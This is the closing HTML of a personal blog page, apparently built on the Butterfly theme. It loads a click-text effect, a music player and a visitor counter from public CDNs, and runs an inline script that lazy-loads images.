</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/click-show-text.min.js" data-mobile="true" data-text="CTF,Web,miHoYo,PureStream,Marblue" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>